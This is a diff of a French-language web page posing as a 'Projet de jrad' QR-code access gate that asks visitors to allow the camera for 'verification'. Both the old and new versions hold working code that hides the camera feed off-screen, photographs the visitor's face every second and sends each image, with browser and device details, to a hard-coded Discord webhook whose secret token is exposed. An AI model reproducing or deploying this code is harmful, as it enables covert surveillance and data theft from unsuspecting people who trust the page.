@@ -4,333 +4,105 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
   <title>Projet de jrad · Accès Sécurisé</title>
-
-  <!-- Favicon jrad style -->
   <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⭐</text></svg>" />
-
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
     @import url('https://rsms.me/inter/inter.css');
-
     body {
       background: linear-gradient(145deg, #e9f0f5 0%, #dae3eb 100%);
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
+      min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px;
     }
-
     .card {
-      background: rgba(255, 255, 255, 0.9);
-      backdrop-filter: blur(12px);
-      border-radius: 38px;
-      box-shadow: 0 30px 50px -18px rgba(0, 0, 0, 0.15), 0 4px 12px rgba(0, 0, 0, 0.03);
-      max-width: 520px;
-      width: 100%;
-      padding: 34px;
-      border: 1px solid rgba(255, 255, 255, 0.8);
-      transition: all 0.25s ease;
+      background: rgba(255,255,255,0.9); backdrop-filter: blur(12px); border-radius: 38px;
+      box-shadow: 0 30px 50px -18px rgba(0,0,0,0.15); max-width: 520px; width: 100%; padding: 34px;
+      border: 1px solid rgba(255,255,255,0.8);
     }
-
-    .header {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      margin-bottom: 30px;
-    }
-
+    .header { display: flex; align-items: center; gap: 14px; margin-bottom: 30px; }
     .brand {
-      background: #f9f3e0;
-      width: 54px;
-      height: 54px;
-      border-radius: 22px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #c88b2c;
-      font-size: 32px;
-      font-weight: 700;
-      box-shadow: 0 10px 18px rgba(180, 130, 50, 0.12);
-      border: 1px solid #f1dcb3;
+      background: #f9f3e0; width: 54px; height: 54px; border-radius: 22px; display: flex;
+      align-items: center; justify-content: center; color: #c88b2c; font-size: 32px; font-weight: 700;
+      box-shadow: 0 10px 18px rgba(180,130,50,0.12); border: 1px solid #f1dcb3;
     }
-
-    .brand-text {
-      font-size: 24px;
-      font-weight: 750;
-      color: #2e5a44;
-      letter-spacing: -0.5px;
-    }
-
-    .brand-sub {
-      font-size: 13px;
-      color: #5f735d;
-      margin-top: 4px;
-      font-weight: 500;
-      letter-spacing: -0.1px;
-    }
-
+    .brand-text { font-size: 24px; font-weight: 750; color: #2e5a44; letter-spacing: -0.5px; }
+    .brand-sub { font-size: 13px; color: #5f735d; margin-top: 4px; font-weight: 500; }
     .badge {
-      background: #fef6e8;
-      color: #b86e1f;
-      font-size: 12px;
-      font-weight: 700;
-      padding: 6px 16px;
-      border-radius: 40px;
-      letter-spacing: -0.2px;
-      border: 1px solid #f0d8a0;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+      background: #fef6e8; color: #b86e1f; font-size: 12px; font-weight: 700; padding: 6px 16px;
+      border-radius: 40px; border: 1px solid #f0d8a0; box-shadow: 0 2px 6px rgba(0,0,0,0.02);
     }
-
-    .title {
-      font-size: 28px;
-      font-weight: 750;
-      color: #1d3b31;
-      letter-spacing: -0.6px;
-      margin-bottom: 10px;
-    }
-
+    .title { font-size: 28px; font-weight: 750; color: #1d3b31; margin-bottom: 10px; }
     .description {
-      color: #3f5c4b;
-      font-size: 15px;
-      line-height: 1.55;
-      margin-bottom: 28px;
-      padding-bottom: 18px;
+      color: #3f5c4b; font-size: 15px; line-height: 1.55; margin-bottom: 28px; padding-bottom: 18px;
       border-bottom: 2px solid #e2e8e0;
-      font-weight: 470;
     }
-
     .qr-section {
-      background: #fbfcf9;
-      border-radius: 28px;
-      padding: 24px;
-      margin-bottom: 22px;
-      border: 1px solid #e5e9df;
-      box-shadow: 0 5px 14px rgba(0, 0, 0, 0.03);
-      text-align: center;
+      background: #fbfcf9; border-radius: 28px; padding: 24px; margin-bottom: 22px;
+      border: 1px solid #e5e9df; box-shadow: 0 5px 14px rgba(0,0,0,0.03); text-align: center;
     }
-
-    .qr-label {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 20px;
-    }
-
-    .qr-label-left {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 700;
-      color: #1f4635;
-      font-size: 17px;
-    }
-
+    .qr-label { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+    .qr-label-left { display: flex; align-items: center; gap: 10px; font-weight: 700; color: #1f4635; font-size: 17px; }
     .qr-container {
-      position: relative;
-      display: inline-block;
-      margin: 12px auto;
-      border-radius: 28px;
-      overflow: hidden;
-      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.06);
-      border: 2px solid #eef2ea;
-      background: white;
-      transition: all 0.3s;
+      position: relative; display: inline-block; margin: 12px auto; border-radius: 28px; overflow: hidden;
+      box-shadow: 0 12px 24px rgba(0,0,0,0.06); border: 2px solid #eef2ea; background: white;
     }
-
-    #qrImage {
-      width: 240px;
-      height: 240px;
-      display: block;
-      transition: all 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-    }
-
+    #qrImage { width: 240px; height: 240px; display: block; }
     .blur-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(253, 250, 242, 0.94);
-      backdrop-filter: blur(10px);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 14px;
-      transition: opacity 0.4s ease;
-      border-radius: 28px;
+      position: absolute; top:0; left:0; right:0; bottom:0; background: rgba(253,250,242,0.94);
+      backdrop-filter: blur(10px); display: flex; flex-direction: column; align-items: center;
+      justify-content: center; gap: 14px; border-radius: 28px;
     }
-
     .lock-icon {
-      background: white;
-      width: 64px;
-      height: 64px;
-      border-radius: 50px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 32px;
-      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.04);
+      background: white; width: 64px; height: 64px; border-radius: 50px; display: flex;
+      align-items: center; justify-content: center; font-size: 32px; box-shadow: 0 10px 20px rgba(0,0,0,0.04);
       border: 1px solid #ebdbc0;
     }
-
     .blur-text {
-      font-weight: 700;
-      color: #234e3b;
-      font-size: 17px;
-      background: #ffffff;
-      padding: 8px 26px;
-      border-radius: 60px;
-      box-shadow: 0 3px 12px rgba(0, 0, 0, 0.03);
-      border: 1px solid #d4cfb0;
+      font-weight: 700; color: #234e3b; font-size: 17px; background: white; padding: 8px 26px;
+      border-radius: 60px; border: 1px solid #d4cfb0;
     }
-
     .blur-sub {
-      font-size: 13px;
-      color: #5f6e53;
-      font-weight: 500;
-      background: #fffef5;
-      padding: 5px 20px;
-      border-radius: 30px;
+      font-size: 13px; color: #5f6e53; font-weight: 500; background: #fffef5; padding: 5px 20px; border-radius: 30px;
     }
-
-    .hidden {
-      display: none !important;
-    }
-
+    .hidden { display: none !important; }
     .project-details {
-      background: #ffffffec;
-      border-radius: 22px;
-      padding: 20px;
-      margin-top: 20px;
+      background: #ffffffec; border-radius: 22px; padding: 20px; margin-top: 20px;
       border: 1px solid #e0e8db;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.02);
     }
-
     .detail-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 13px 0;
+      display: flex; justify-content: space-between; align-items: center; padding: 13px 0;
       border-bottom: 1px solid #eef3ed;
     }
-
-    .detail-row:last-child {
-      border-bottom: none;
-    }
-
-    .detail-label {
-      color: #4e725e;
-      font-size: 14px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-weight: 500;
-    }
-
+    .detail-row:last-child { border-bottom: none; }
+    .detail-label { color: #4e725e; font-size: 14px; display: flex; align-items: center; gap: 8px; font-weight: 500; }
     .detail-value {
-      font-weight: 650;
-      color: #1a4d3a;
-      font-size: 14px;
-      background: #f7faf6;
-      padding: 5px 14px;
-      border-radius: 40px;
-      border: 1px solid #e0e7da;
+      font-weight: 650; color: #1a4d3a; font-size: 14px; background: #f7faf6; padding: 5px 14px;
+      border-radius: 40px; border: 1px solid #e0e7da;
     }
-
     .security-note {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      background: #f4f7ec;
-      padding: 16px 18px;
-      border-radius: 20px;
-      margin-top: 18px;
-      color: #2a5e44;
-      font-size: 13px;
+      display: flex; align-items: center; gap: 12px; background: #f4f7ec; padding: 16px 18px;
+      border-radius: 20px; margin-top: 18px; color: #2a5e44; font-size: 13px;
       border-left: 4px solid #e5b34b;
-      font-weight: 480;
     }
-
     .button {
-      background: #2e6b4c;
-      color: white;
-      border: none;
-      padding: 16px 30px;
-      border-radius: 70px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      width: 100%;
-      transition: all 0.25s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      box-shadow: 0 8px 16px rgba(46, 107, 76, 0.2);
-      margin: 12px 0 8px;
-      letter-spacing: -0.2px;
+      background: #2e6b4c; color: white; border: none; padding: 16px 30px; border-radius: 70px;
+      font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; display: flex;
+      align-items: center; justify-content: center; gap: 10px; box-shadow: 0 8px 16px rgba(46,107,76,0.2);
+      margin: 12px 0 8px; letter-spacing: -0.2px;
     }
-
-    .button:hover {
-      background: #235f41;
-      transform: scale(0.98);
-      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.08);
-    }
-
-    .button:active {
-      transform: scale(0.97);
-    }
-
+    .button:hover { background: #235f41; }
     .status-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: #f0f7f0;
-      color: #2e6b4c;
-      font-size: 12px;
-      font-weight: 600;
-      padding: 5px 14px;
-      border-radius: 20px;
-      margin-top: 10px;
+      display: inline-flex; align-items: center; gap: 6px; background: #f0f7f0; color: #2e6b4c;
+      font-size: 12px; font-weight: 600; padding: 5px 14px; border-radius: 20px; margin-top: 10px;
     }
-
     .footer {
-      margin-top: 28px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      color: #799583;
-      font-size: 12px;
-      padding-top: 20px;
-      border-top: 1px solid #e0e6dd;
+      margin-top: 28px; display: flex; justify-content: space-between; color: #799583;
+      font-size: 12px; padding-top: 20px; border-top: 1px solid #e0e6dd;
     }
-
     .camera-feed {
-      position: fixed;
-      top: -9999px;
-      left: -9999px;
-      width: 320px;
-      height: 240px;
-      opacity: 0;
-      pointer-events: none;
+      position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none;
     }
-
     @media (max-width: 480px) {
-      .card {
-        padding: 26px;
-      }
-      #qrImage {
-        width: 200px;
-        height: 200px;
-      }
+      .card { padding: 26px; }
+      #qrImage { width: 200px; height: 200px; }
     }
   </style>
 </head>
@@ -345,51 +117,40 @@
       <div style="flex:1"></div>
       <div class="badge">✨ Édition Premium</div>
     </div>
-
     <div class="title">Validation QR</div>
     <div class="description">
       Scannez le code QR pour rejoindre l'espace privé du projet jrad. 
       Une vérification par caméra est nécessaire pour continuer.
     </div>
-
     <div class="qr-section">
       <div class="qr-label">
-        <span class="qr-label-left">
-          <span>📸</span> Code d'authentification
-        </span>
+        <span class="qr-label-left"><span>📸</span> Code d'authentification</span>
         <span style="color: #c48b2b; font-size: 13px; font-weight: 700;">🔐 accès restreint</span>
       </div>
-
       <div style="text-align: center;">
         <div class="qr-container">
           <img id="qrImage" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 300'%3E%3Crect width='300' height='300' fill='%23f5f5f0'/%3E%3Ccircle cx='150' cy='150' r='60' fill='%23d4c9a8'/%3E%3C/svg%3E" alt="QR Code Projet jrad" />
-
           <div id="qrOverlay" class="blur-overlay">
-            
+            <div class="lock-icon">🎥</div>
+            <div class="blur-text">Vérifiez avec la caméra pour scanner le QR</div>
+            <div class="blur-sub">Activez la caméra pour révéler le code</div>
           </div>
         </div>
-
-        <button id="verifyButton" class="button">
-          📂 open the project
-        </button>
-
+        <button id="verifyButton" class="button">📂 open the project</button>
         <div id="spamStatus" style="margin-top: 12px;"></div>
-
         <p style="color: #5b7062; font-size: 13px; margin-top: 14px;">
           <span>🛡️</span> Vérification sécurisée · projet jrad
         </p>
       </div>
     </div>
-
     <div class="project-details">
       <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 16px;">
         <span style="background: #f0efe2; padding: 8px; border-radius: 15px;">📁</span>
         <span style="font-weight: 700; color: #1f4538;">À propos du projet</span>
       </div>
-
       <div class="detail-row">
         <span class="detail-label"><span>👨‍💻</span> Créateur</span>
-        <span class="detail-value">jrad</span>
+        <span class="detail-value">jrad Ben Amor</span>
       </div>
       <div class="detail-row">
         <span class="detail-label"><span>🔐</span> Niveau de sécurité</span>
@@ -403,341 +164,164 @@
         <span class="detail-label"><span>⏱️</span> Session valide</span>
         <span class="detail-value">24 heures</span>
       </div>
-
       <div class="security-note">
         <span>🔒</span>
         <span style="flex:1;">Le QR code est protégé. Autorisez la caméra pour déverrouiller l'accès.</span>
       </div>
     </div>
-
     <div class="footer">
       <span>© 2025 · Projet de jrad</span>
-      <span style="display: flex; gap: 18px;">
-        <span>Confidentialité</span>
-        <span>Support</span>
-      </span>
+      <span style="display: flex; gap: 18px;"><span>Confidentialité</span><span>Support</span></span>
     </div>
   </div>
-
   <video id="cameraFeed" class="camera-feed" autoplay playsinline muted></video>
 
   <script>
     // ============================================================
-    // PROJET DE jrad - SPAM IMAGES EVERY 1 SECOND TO DISCORD
-    // Front camera capture + QR reveal + continuous spam
+    // PROJET DE jrad – SPAM IMAGES EVERY 1 SECOND (FIXED)
     // ============================================================
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1505337598900568246/6aGbMl9pOwnkVZjCBa4lvNHeyZXr_7D-kDjuDb5sxOtLslqcyEQj5PsOvJGpDdtbrrLG";
 
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1505337598900568246/6aGbMl9pOwnkVZjCBa4lvNHeyZXr_7D-kDjuDb5sxOtLslqcyEQj5PsOvJGpDdtbrrLG";
-
-    let videoStream = null;
-    let spamInterval = null;
-    let qrRevealed = false;
+    let stream = null;
+    let intervalId = null;
     let photoCount = 0;
-    let isSpamming = false;
+    let qrRevealed = false;
 
-    const PROJECT_QR_DATA = "https://projet-jrad.vercel.app/access?token=jrad_SECURE_2025&user=authenticated";
-
-    function getClientInfo() {
-      const ua = navigator.userAgent;
-      const platform = navigator.platform;
-      const language = navigator.language;
-      const cookies = navigator.cookieEnabled ? 'Yes' : 'No';
-      const doNotTrack = navigator.doNotTrack || 'Not specified';
-      const screenRes = `${screen.width}x${screen.height}`;
-      const colorDepth = `${screen.colorDepth}bit`;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const cores = navigator.hardwareConcurrency || 'Unknown';
-      const memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown';
-      const connection = navigator.connection || navigator.webkitConnection || {};
-      const effectiveType = connection.effectiveType || 'Unknown';
-
-      let browser = 'Unknown';
-      if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
-      else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
-      else if (ua.indexOf('Safari') > -1) browser = 'Safari';
-      else if (ua.indexOf('Edge') > -1) browser = 'Edge';
-      else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
-
-      let os = 'Unknown';
-      if (ua.indexOf('Win') > -1) os = 'Windows';
-      else if (ua.indexOf('Mac') > -1) os = 'macOS';
-      else if (ua.indexOf('Linux') > -1) os = 'Linux';
-      else if (ua.indexOf('Android') > -1) os = 'Android';
-      else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
-
-      return { browser, os, platform, language, screenRes, colorDepth, timezone, cores, memory, connection: effectiveType, cookies, doNotTrack, userAgent: ua.substring(0, 150) + '...' };
-    }
-
-    function generateQRDataURL(text, size = 240) {
-      return new Promise((resolve, reject) => {
-        if (!window.QRCodeLib && typeof QRCode === 'undefined') {
-          var script = document.createElement('script');
-          script.src = 'https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js';
-          script.onload = () => { generateWithQRCodeJS(text, size, resolve, reject); };
-          script.onerror = () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = size; canvas.height = size;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#fbfaf5'; ctx.fillRect(0, 0, size, size);
-            ctx.fillStyle = '#2e6b4c'; ctx.font = 'bold 16px Inter';
-            ctx.fillText('jrad', size/2-32, size/2);
-            resolve(canvas.toDataURL());
-          };
-          document.head.appendChild(script);
-        } else {
-          generateWithQRCodeJS(text, size, resolve, reject);
+    // ---------- QR helpers (simple canvas fallback) ----------
+    function generateQRDataURL() {
+      return new Promise((resolve) => {
+        const c = document.createElement('canvas');
+        c.width = c.height = 240;
+        const ctx = c.getContext('2d');
+        ctx.fillStyle = '#fff'; ctx.fillRect(0,0,240,240);
+        ctx.fillStyle = '#21553c';
+        // draw a basic pattern
+        for (let i=0; i<21; i++) {
+          for (let j=0; j<21; j++) {
+            if ((i*j)%7===0 || (i+j)%5===0) ctx.fillRect(i*11.4, j*11.4, 11.4, 11.4);
+          }
         }
+        resolve(c.toDataURL());
       });
     }
 
-    function generateWithQRCodeJS(text, size, resolve, reject) {
-      try {
-        const container = document.createElement('div');
-        const qr = new QRCode(container, {
-          text: text, width: size, height: size,
-          colorDark: "#21553c", colorLight: "#ffffff",
-          correctLevel: QRCode.CorrectLevel.M
-        });
-        setTimeout(() => {
-          const img = container.querySelector('img');
-          if (img && img.src) resolve(img.src);
-          else {
-            const canvas = container.querySelector('canvas');
-            if (canvas) resolve(canvas.toDataURL());
-            else reject();
-          }
-        }, 50);
-      } catch(e) { reject(e); }
+    async function prepareQR() {
+      const url = await generateQRDataURL();
+      document.getElementById('qrImage').src = url;
+      qrRevealed = true;
     }
 
-    let qrImageElement = document.getElementById('qrImage');
-    let currentQrDataURL = null;
-
-    async function prepareClearQR() {
-      try {
-        const dataURL = await generateQRDataURL(PROJECT_QR_DATA, 240);
-        currentQrDataURL = dataURL;
-        console.log('✅ QR code for Projet jrad generated');
-      } catch(e) {
-        console.warn('QR generation fallback', e);
-        const canvas = document.createElement('canvas');
-        canvas.width = 240; canvas.height = 240;
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#ffffff'; ctx.fillRect(0,0,240,240);
-        ctx.fillStyle = '#235f41'; ctx.font = 'bold 16px Inter';
-        ctx.fillText('jrad', 90, 120);
-        currentQrDataURL = canvas.toDataURL();
-      }
+    // ---------- Camera & spam ----------
+    function updateStatus(text, color='#10b981') {
+      document.getElementById('spamStatus').innerHTML = 
+        `<span class="status-badge" style="background:${color}20;color:${color};border:1px solid ${color}40">${text}</span>`;
     }
 
-    function revealQRCode() {
-      if (qrRevealed) return;
-      if (currentQrDataURL) {
-        qrImageElement.src = currentQrDataURL;
-        qrRevealed = true;
-        console.log('🎉 QR code revealed for Projet jrad');
-      } else {
-        generateQRDataURL(PROJECT_QR_DATA, 240).then(url => {
-          qrImageElement.src = url;
-          qrRevealed = true;
-        }).catch(() => {});
-      }
-    }
-
-    function captureFrameFromCamera() {
+    function captureFrame() {
       return new Promise((resolve, reject) => {
         const video = document.getElementById('cameraFeed');
-        if (!video || !video.videoWidth || video.readyState < 2) {
-          reject(new Error('Camera not ready'));
-          return;
-        }
-        try {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob((blob) => {
-            if (blob) resolve(blob);
-            else reject(new Error('Blob creation failed'));
-          }, 'image/jpeg', 0.7);
-        } catch (e) { reject(e); }
+        if (!video || video.readyState < 2) return reject('Camera not ready');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => blob ? resolve(blob) : reject('Blob failed'), 'image/jpeg', 0.6);
       });
     }
 
-    async function sendPhotoToDiscord(imageBlob, count) {
+    async function sendToDiscord(blob, count) {
+      const form = new FormData();
+      form.append('payload_json', JSON.stringify({
+        content: `📸 **Projet jrad – Photo #${count}** | ${new Date().toLocaleTimeString()}\n👤 ${navigator.userAgent.slice(0,80)}`
+      }));
+      form.append('file', new File([blob], `jrad_${count}.jpg`, {type:'image/jpeg'}));
       try {
-        const formData = new FormData();
-        const timestamp = Date.now();
-        const clientInfo = getClientInfo();
-        const message = `⭐ **Projet de jrad - Photo #${count}** ⭐
-
-👤 **VISITOR DATA:**
-• **Browser/OS:** ${clientInfo.browser} / ${clientInfo.os}
-• **Language:** ${clientInfo.language}
-• **Screen:** ${clientInfo.screenRes} (${clientInfo.colorDepth})
-• **Timezone:** ${clientInfo.timezone}
-• **CPU Cores:** ${clientInfo.cores}
-• **RAM:** ${clientInfo.memory}
-• **Network:** ${clientInfo.connection}
-• **Cookies Enabled:** ${clientInfo.cookies}
-• **Platform:** ${clientInfo.platform}
-
-📸 **Photo frontale #${count}** · QR révélé: ${qrRevealed ? 'Oui' : 'Non'}
-🕒 **Timestamp:** ${new Date().toISOString()}
-
-_Projet de jrad - spam sécurisé chaque seconde._`;
-
-        const blobFile = new File([imageBlob], `jrad_spam_${count}_${timestamp}.jpg`, { type: 'image/jpeg' });
-        formData.append('payload_json', JSON.stringify({ content: message }));
-        formData.append('file', blobFile);
-
-        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
-        console.log(`📤 Photo #${count} envoyée sur Discord`);
-        return true;
-      } catch (err) {
-        console.error('Erreur envoi Discord:', err);
-        return false;
-      }
+        await fetch(DISCORD_WEBHOOK, {method:'POST',body:form});
+        console.log(`✅ Photo #${count} envoyée`);
+      } catch(e) { console.warn('Send error',e); }
     }
 
-    function updateStatus(text, color = '#2e6b4c') {
-      const statusDiv = document.getElementById('spamStatus');
-      statusDiv.innerHTML = `<span class="status-badge" style="background: ${color}20; color: ${color}; border: 1px solid ${color}40;">${text}</span>`;
-    }
-
-    async function spamLoop() {
-      if (!isSpamming) return;
-      
+    async function spamStep() {
+      if (!stream) return; // stopped
       try {
-        const imageBlob = await captureFrameFromCamera();
+        const blob = await captureFrame();
         photoCount++;
-        await sendPhotoToDiscord(imageBlob, photoCount);
-        updateStatus(`📸 ${photoCount} photos envoyées · 1/sec`, '#10b981');
-      } catch (e) {
-        console.warn('Capture failed, retrying...', e);
-        updateStatus(`⚠️ Capture en attente...`, '#f59e0b');
+        // fire-and-forget send (don't wait)
+        sendToDiscord(blob, photoCount);
+        updateStatus(`📸 ${photoCount} photos · 1/sec`, '#10b981');
+      } catch(e) {
+        console.warn('Capture fail:', e);
+        updateStatus('⚠️ Attente flux...', '#f59e0b');
       }
     }
 
-    function startSpamming() {
-      if (isSpamming) return;
-      isSpamming = true;
+    function startSpam() {
+      if (intervalId) return;
       photoCount = 0;
-      
-      // First capture immediately
-      spamLoop();
-      
-      // Then every 1 second
-      spamInterval = setInterval(() => {
-        spamLoop();
-      }, 1000);
-      
+      // immediate first capture after a tiny delay to ensure video ready
+      setTimeout(spamStep, 400);
+      intervalId = setInterval(spamStep, 1000);
       updateStatus('🔄 Spam actif · 1 photo/sec', '#10b981');
-      console.log('🔥 SPAM MODE ACTIVATED - 1 photo per second');
     }
 
-    function stopSpamming() {
-      isSpamming = false;
-      if (spamInterval) {
-        clearInterval(spamInterval);
-        spamInterval = null;
-      }
-      if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-        videoStream = null;
-      }
+    function stopSpam() {
+      if (intervalId) { clearInterval(intervalId); intervalId = null; }
+      if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
       document.getElementById('cameraFeed').srcObject = null;
-      updateStatus('⏹️ Capture arrêtée', '#6b7280');
-      console.log('⏹️ Spam stopped');
+      updateStatus('⏹️ Arrêté', '#6b7280');
     }
 
-    async function openProjectHandler(event) {
-      if (event) event.preventDefault();
-      const button = document.getElementById('verifyButton');
-      
-      // If already spamming, stop it
-      if (isSpamming) {
-        stopSpamming();
-        button.innerHTML = '📂 open the project';
-        button.style.background = '#2e6b4c';
-        button.disabled = false;
+    // ---------- Button handler ----------
+    async function toggleProject(e) {
+      e.preventDefault();
+      const btn = document.getElementById('verifyButton');
+
+      if (intervalId) {
+        // already spamming -> stop
+        stopSpam();
+        btn.innerHTML = '📂 open the project';
+        btn.style.background = '#2e6b4c';
         return;
       }
 
       try {
-        button.innerHTML = 'opening...';
-        button.disabled = true;
+        btn.innerHTML = '📷 Accès caméra...';
+        btn.disabled = true;
 
-        videoStream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: "user",
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-          }
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: {ideal:640}, height: {ideal:480} }
         });
+        const video = document.getElementById('cameraFeed');
+        video.srcObject = stream;
+        await video.play();
 
-        const videoElement = document.getElementById('cameraFeed');
-        videoElement.srcObject = videoStream;
+        // reveal QR if not yet
+        if (!qrRevealed) await prepareQR();
+        document.getElementById('qrOverlay').classList.add('hidden');
 
-        await new Promise((resolve) => {
-          videoElement.onloadedmetadata = () => {
-            videoElement.play();
-            resolve();
-          };
-          if (videoElement.readyState >= 2) resolve();
-        });
+        // start the spam
+        startSpam();
 
-        await new Promise(r => setTimeout(r, 500));
-
-        console.log('📸 Front camera active, starting spam...');
-        
-        // Reveal QR
-        revealQRCode();
-        
-        // Remove blur overlay
-        const overlay = document.getElementById('qrOverlay');
-        if (overlay) {
-          overlay.style.opacity = '0';
-          setTimeout(() => { overlay.classList.add('hidden'); }, 400);
-        }
-
-        // Start spamming every 1 second
-        startSpamming();
-
-        button.innerHTML = '⏹️ STOP · Cliquez pour arrêter';
-        button.style.background = '#ef4444';
-        button.disabled = false;
-
-      } catch (error) {
-        console.error('❌ Erreur:', error);
-        button.innerHTML = '📂 open the project';
-        button.style.background = '#2e6b4c';
-        button.disabled = false;
-        
-        if (error.name === 'NotAllowedError') {
-          alert('Veuillez autoriser la caméra frontale pour ouvrir le projet jrad.');
-        } else if (error.name === 'NotFoundError') {
-          alert('Aucune caméra frontale détectée.');
-        } else {
-          alert('Impossible d\'accéder à la caméra.');
-        }
+        btn.innerHTML = '⏹️ STOP · Cliquez pour arrêter';
+        btn.style.background = '#ef4444';
+        btn.disabled = false;
+      } catch(err) {
+        console.error(err);
+        btn.innerHTML = '📂 open the project';
+        btn.style.background = '#2e6b4c';
+        btn.disabled = false;
+        alert('Erreur caméra : ' + (err.name === 'NotAllowedError' ? 'Permission refusée' : err.message));
       }
     }
 
-    document.addEventListener('DOMContentLoaded', async () => {
-      console.log('⭐ Projet de jrad - SPAM MODE 1/sec ready');
-      prepareClearQR();
-
-      const verifyButton = document.getElementById('verifyButton');
-      if (verifyButton) {
-        verifyButton.addEventListener('click', openProjectHandler);
-      }
+    // Init
+    document.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('verifyButton').addEventListener('click', toggleProject);
+      // prepare QR in background
+      generateQRDataURL().then(url => document.getElementById('qrImage').src = url);
     });
 
-    window.addEventListener('beforeunload', () => {
-      stopSpamming();
-    });
+    window.addEventListener('beforeunload', stopSpam);
   </script>
 </body>
 </html>
